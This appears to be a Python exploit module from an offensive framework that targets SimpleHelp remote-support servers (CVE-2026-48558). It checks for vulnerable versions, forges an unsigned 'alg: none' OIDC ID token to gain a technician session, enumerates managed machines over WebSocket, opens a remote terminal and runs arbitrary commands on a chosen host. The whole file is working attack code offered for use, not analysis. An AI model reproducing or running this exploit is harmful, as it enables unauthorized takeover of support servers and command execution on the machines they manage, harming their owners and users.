#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""SimpleHelp OIDC authentication bypass + remote WebSocket (CVE-2026-48558)."""

from __future__ import annotations

import base64
import json
import queue
import re
import secrets
import ssl
import threading
import time
from typing import Any, Callable, Dict, List, Optional, Tuple
from urllib.parse import parse_qs, urlparse

from core.framework.base_module import BaseModule

try:
    import websocket
except ImportError:
    websocket = None

_VERSION_RE = re.compile(r"^Visual Version:\s*(\d+\.\d+(?:\.\d+)?)", re.M)

TECH_SERVER_PLANE = 0
USER_CONNECT_PLANE = 2
SOCKET_SETUP_PLANE = 0
TERMINAL_PLANE = 5

TRANSACTION_WRAPPER = -1524849380
GET_MACHINE_LIST = 13000
CONNECT_TO_MACHINE = 8000

TOTP_TOKEN_REQUEST = 170
SOCKET_FIRST = -4517462
SOCKET_PASSWORD_OK = -1412623820
SOCKET_BAD_PASSWORD = 1126292666
TERMINAL_COMMAND = 655362
TERMINAL_OUTPUT = 655363
TERMINAL_NEW = 655369


def parse_simplehelp_version(text: str) -> str:
    match = _VERSION_RE.search(text or "")
    return match.group(1) if match else ""


def version_tuple(version: str) -> tuple[int, ...]:
    parts: List[int] = []
    for token in str(version or "").split("."):
        digits = "".join(ch for ch in token if ch.isdigit())
        parts.append(int(digits) if digits else 0)
    return tuple(parts)


def version_vulnerable(version: str) -> bool:
    vt = version_tuple(version)
    if not vt:
        return False
    if (5, 5, 0) <= vt <= (5, 5, 15):
        return True
    if vt >= (6, 0, 0) and vt < (6, 1, 0):
        return True
    return False


def forge_id_token(username: str, email: str, display: str, nonce: str = "") -> str:
    header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).rstrip(b"=").decode()
    claims = {
        "sub": secrets.token_hex(8),
        "preferred_username": username,
        "name": display,
        "email": email,
        "iat": int(time.time()),
        "exp": int(time.time()) + 3600,
    }
    if nonce:
        claims["nonce"] = nonce
    payload = base64.urlsafe_b64encode(json.dumps(claims).encode()).rstrip(b"=").decode()
    return f"{header}.{payload}.x"


def parse_oidc_providers(options_json: Any) -> List[dict]:
    if not isinstance(options_json, list):
        return []
    out: List[dict] = []
    for item in options_json:
        if not isinstance(item, dict):
            continue
        if str(item.get("type") or "").lower() in ("oidc", "azure"):
            out.append(item)
    return out


def state_from_authorization_url(url: str) -> tuple[str, str]:
    parsed = urlparse(url)
    query = parse_qs(parsed.query)
    state = (query.get("state") or [""])[0]
    nonce = (query.get("nonce") or [""])[0]
    return state, nonce


def shell_for_os(os_name: str) -> int:
    text = str(os_name or "")
    if re.search(r"windows", text, re.I):
        return 1
    return 3


def select_online_machine(machines: List[dict], machine_id: str = "") -> dict:
    if machine_id:
        match = next((m for m in machines if str(m.get("machineID")) == machine_id), None)
        if not match:
            raise RuntimeError(f"Managed machine {machine_id} not found")
        if not match.get("online"):
            raise RuntimeError(f"Machine {machine_id} is offline")
        return match
    online = next((m for m in machines if m.get("online")), None)
    if not online:
        raise RuntimeError("No online managed machines visible")
    return online


class SimpleHelpWsSession:
    """WebSocket technician session (MSR protocol parity)."""

    def __init__(
        self,
        ws_url: str,
        session_token: str,
        *,
        verify_ssl: bool = False,
        timeout: float = 45.0,
    ):
        if websocket is None:
            raise RuntimeError("pip install websocket-client")
        self.ws_url = ws_url
        self.session_token = session_token
        self.timeout = timeout
        self._inbox: queue.Queue = queue.Queue()
        self._ws: Optional[Any] = None
        self._thread: Optional[threading.Thread] = None
        self._sslopt = None if verify_ssl else {"cert_reqs": ssl.CERT_NONE}

    def _on_message(self, _ws, raw: str) -> None:
        try:
            self._inbox.put(json.loads(raw))
        except json.JSONDecodeError:
            pass

    def connect(self) -> None:
        headers = [f"Cookie: shelp-tc-sessionid={self.session_token}"]
        self._ws = websocket.WebSocketApp(
            self.ws_url,
            header=headers,
            on_message=self._on_message,
        )

        def runner():
            assert self._ws is not None
            self._ws.run_forever(ping_interval=20, sslopt=self._sslopt)

        self._thread = threading.Thread(target=runner, daemon=True)
        self._thread.start()
        time.sleep(0.35)

    def close(self) -> None:
        if self._ws:
            try:
                self._ws.close()
            except Exception:
                pass

    def send(self, message: dict) -> None:
        if not self._ws:
            raise RuntimeError("WebSocket not connected")
        self._ws.send(json.dumps(message))

    def wait_for(
        self,
        predicate: Callable[[dict], Any],
        description: str = "message",
        timeout: Optional[float] = None,
    ) -> Any:
        deadline = time.time() + float(timeout if timeout is not None else self.timeout)
        while time.time() < deadline:
            remaining = max(0.1, deadline - time.time())
            try:
                msg = self._inbox.get(timeout=remaining)
            except queue.Empty:
                break
            result = predicate(msg)
            if result is not None and result is not False:
                return result
        raise TimeoutError(f"Timed out waiting for {description}")

    def authenticate_technician(self) -> dict:
        self.send({"credentials": {"sessionToken64": self.session_token}})
        login_accepted = False

        def step(message: dict):
            nonlocal login_accepted
            code = message.get("code")
            if code == TOTP_TOKEN_REQUEST:
                self.send({"message": "NONE"})
                return False
            if code == 1:
                login_accepted = True
                return False
            if isinstance(code, int) and code < 0:
                raise RuntimeError("Technician session rejected by WebSocket")
            if login_accepted and isinstance(message.get("transientTechUser"), dict):
                return message["transientTechUser"]
            return False

        return self.wait_for(step, "technician WebSocket authentication")

    def send_tech_transaction(self, conversation_id: int, request: dict) -> None:
        self.send(
            {
                "plane": TECH_SERVER_PLANE,
                "payload": {
                    "type": TRANSACTION_WRAPPER,
                    "conv": conversation_id,
                    "payload": request,
                },
            }
        )

    def send_user_plane(self, plane: int, payload: dict) -> None:
        self.send(
            {
                "plane": USER_CONNECT_PLANE,
                "payload": {"plane": plane, "payload": payload},
            }
        )

    def enumerate_machines(self) -> List[dict]:
        self.send_tech_transaction(0, {"type": GET_MACHINE_LIST})

        def step(message: dict):
            if message.get("plane") != TECH_SERVER_PLANE:
                return False
            outer = message.get("payload") or {}
            if not isinstance(outer, dict):
                return False
            inner = outer.get("payload") or outer
            if isinstance(inner, dict) and isinstance(inner.get("machines"), list):
                return inner["machines"]
            machines = outer.get("machines")
            return machines if isinstance(machines, list) else False

        return self.wait_for(step, "managed machine list", timeout=25)

    def establish_remote_terminal(self, machine_id: str, technician: dict, shell: int = 3) -> None:
        self.send_tech_transaction(1, {"type": CONNECT_TO_MACHINE, "machineID": machine_id})
        connection_accepted = False
        socket_authenticated = False
        terminal_output = ""

        def step(message: dict) -> Any:
            nonlocal connection_accepted, socket_authenticated, terminal_output
            if message.get("plane") == TECH_SERVER_PLANE:
                envelope = message.get("payload") or {}
                if isinstance(envelope, dict) and envelope.get("conv") == 1:
                    response = envelope.get("payload") or {}
                    rtype = response.get("type")
                    if rtype == -3:
                        note = response.get("note", "")
                        raise RuntimeError(f"Remote session refused: {note}")
                    if isinstance(rtype, int) and rtype < 0:
                        raise RuntimeError(
                            f"Remote connection error {rtype}: {response.get('note', '')}"
                        )
                    if rtype == 1:
                        connection_accepted = True

            if message.get("plane") != USER_CONNECT_PLANE:
                return False
            nested = message.get("payload")
            if not isinstance(nested, dict) or nested.get("plane") is None:
                return False
            nested_payload = nested.get("payload")
            if not isinstance(nested_payload, dict):
                return False

            if nested.get("plane") == SOCKET_SETUP_PLANE:
                stype = nested_payload.get("type")
                if stype == SOCKET_FIRST:
                    self.send_user_plane(SOCKET_SETUP_PLANE, {"password": ""})
                elif stype == SOCKET_BAD_PASSWORD:
                    raise RuntimeError("Managed machine requires a remote access password")
                elif stype == SOCKET_PASSWORD_OK:
                    basic = {
                        "uniqueID": technician.get("uniqueID"),
                        "displayName": technician.get("displayName"),
                        "username": technician.get("username"),
                        "emailAddress": technician.get("emailAddress"),
                        "isOnline": True,
                    }
                    self.send_user_plane(SOCKET_SETUP_PLANE, basic)
                    time.sleep(0.5)
                    self.send_user_plane(
                        TERMINAL_PLANE,
                        {
                            "type": TERMINAL_NEW,
                            "terminalNumber": 0,
                            "shell": shell,
                        },
                    )
                    socket_authenticated = True
            elif nested.get("plane") == TERMINAL_PLANE and nested_payload.get("type") == TERMINAL_OUTPUT:
                data = nested_payload.get("data")
                if isinstance(data, list):
                    terminal_output += bytes(data).decode("utf-8", errors="replace")
                elif isinstance(data, str):
                    terminal_output += data

            if connection_accepted and socket_authenticated and re.search(
                r"(?:[>$%]\s*|#\s*)\Z", terminal_output
            ):
                return True
            return False

        self.wait_for(step, "remote terminal prompt", timeout=45)

    def run_terminal_command(self, command: str) -> None:
        self.send_user_plane(
            TERMINAL_PLANE,
            {
                "type": TERMINAL_COMMAND,
                "terminalNumber": 0,
                "dataString": f"{command}\n",
            },
        )


class SimpleHelp(BaseModule):
    """SimpleHelp HTTP + WebSocket mixin (combine with Http_client)."""

    def simplehelp_join(self, suffix: str) -> str:
        base = (getattr(self, "path", None) or "/")
        if hasattr(base, "value"):
            base = base.value
        base = str(base).rstrip("/")
        suffix = suffix if suffix.startswith("/") else f"/{suffix}"
        return f"{base}{suffix}" if base else suffix

    def simplehelp_ws_url(self) -> str:
        use_ssl = bool(getattr(self, "ssl", True))
        if hasattr(use_ssl, "value"):
            use_ssl = use_ssl.value
        scheme = "wss" if use_ssl else "ws"
        host = str(getattr(self, "target", "") or getattr(self, "rhost", "") or "")
        port = int(getattr(self, "port", 443 if use_ssl else 80) or 0)
        default = 443 if scheme == "wss" else 80
        authority = host if port == default else f"{host}:{port}"
        return f"{scheme}://{authority}{self.simplehelp_join('/')}"

    def simplehelp_version(self) -> str:
        res = self.http_request(method="GET", path=self.simplehelp_join("/allversions"))
        return parse_simplehelp_version((res.text or "") if res else "")

    @staticmethod
    def simplehelp_version_vulnerable(version: str) -> bool:
        return version_vulnerable(version)

    def simplehelp_oidc_providers(self) -> List[dict]:
        login = self.http_request(method="GET", path=self.simplehelp_join("/auth/v1/account/login_options"))
        body: Any = []
        try:
            body = login.json() if login else []
        except Exception:
            body = []
        return parse_oidc_providers(body)

    def simplehelp_scan(self) -> Tuple[bool, str, str]:
        version = self.simplehelp_version()
        if not version:
            return False, "", "version unknown"
        if not version_vulnerable(version):
            return False, version, f"SimpleHelp {version} patched"
        providers = self.simplehelp_oidc_providers()
        if not providers:
            return False, version, f"SimpleHelp {version} but no OIDC"
        names = ", ".join(str(p.get("name") or "") for p in providers[:3])
        return True, version, f"SimpleHelp {version} OIDC: {names}"

    def simplehelp_check(self) -> dict:
        version = self.simplehelp_version()
        if not version_vulnerable(version):
            return {"vulnerable": False, "reason": f"Version {version}", "confidence": "high"}
        if self.simplehelp_oidc_providers():
            return {"vulnerable": True, "reason": f"SimpleHelp {version} + OIDC", "confidence": "high"}
        return {"vulnerable": False, "reason": "OIDC not configured", "confidence": "medium"}

    def simplehelp_technician_session(self, oidc_provider: str = "") -> Tuple[str, str]:
        ver = self.simplehelp_version()
        if not version_vulnerable(ver):
            raise RuntimeError(f"SimpleHelp {ver or '?'} not in vulnerable range")

        providers = self.simplehelp_oidc_providers()
        if not providers:
            raise RuntimeError("No OIDC providers exposed")
        provider = providers[0]
        pick = (oidc_provider or "").strip()
        if pick:
            provider = next((p for p in providers if p.get("name") == pick), provider)

        callback = f"{self.simplehelp_join('/webapps/technician')}/"
        flow = self.http_request(
            method="GET",
            path=self.simplehelp_join("/auth/v1/account/oidc_get"),
            params={"payload": json.dumps({**provider, "callback": callback})},
            session=True,
        )
        auth_url = (flow.text or "").strip() if flow else ""
        if not auth_url.startswith("http"):
            raise RuntimeError("OIDC flow did not return authorization URL")
        state, nonce = state_from_authorization_url(auth_url)
        user = f"ks_{secrets.token_hex(4)}"
        id_token = forge_id_token(user, f"{user}@lab.local", user, nonce=nonce)
        self.http_request(
            method="POST",
            path=self.simplehelp_join("/oidc"),
            data={"state": state, "id_token": id_token},
            session=True,
        )
        status = self.http_request(
            method="GET", path=self.simplehelp_join("/auth/v1/account/status"), session=True
        )
        doc = status.json() if status else {}
        if doc.get("state") != "FULLY_AUTHENTICATED":
            raise RuntimeError("Forged token did not create technician session")
        session_token = ""
        if getattr(self, "session", None) is not None:
            session_token = self.session.cookies.get("shelp-tc-sessionid", "")
        if not session_token and status and getattr(status, "cookies", None):
            session_token = status.cookies.get("shelp-tc-sessionid", "")
        session_token = session_token or doc.get("sessionToken64") or doc.get("sessionToken") or ""
        if not session_token:
            raise RuntimeError("Technician session cookie missing")
        return session_token, user

    def simplehelp_run_remote_command(
        self,
        command: str,
        *,
        machine_id: str = "",
        oidc_provider: str = "",
    ) -> dict:
        session_token, user = self.simplehelp_technician_session(oidc_provider=oidc_provider)
        verify_opt = getattr(self, "verify_ssl", False)
        if hasattr(verify_opt, "value"):
            verify_opt = verify_opt.value
        ws = SimpleHelpWsSession(
            self.simplehelp_ws_url(),
            session_token,
            verify_ssl=bool(verify_opt),
        )
        try:
            ws.connect()
            technician = ws.authenticate_technician()
            machines = ws.enumerate_machines()
            machine = select_online_machine(machines, machine_id)
            mid = str(machine.get("machineID", ""))
            shell = shell_for_os(str(machine.get("os") or ""))
            ws.establish_remote_terminal(mid, technician, shell=shell)
            ws.run_terminal_command(command)
            return {
                "user": user,
                "machine_id": mid,
                "machine_name": machine.get("name", mid),
                "machine_count": len(machines),
            }
        finally:
            ws.close()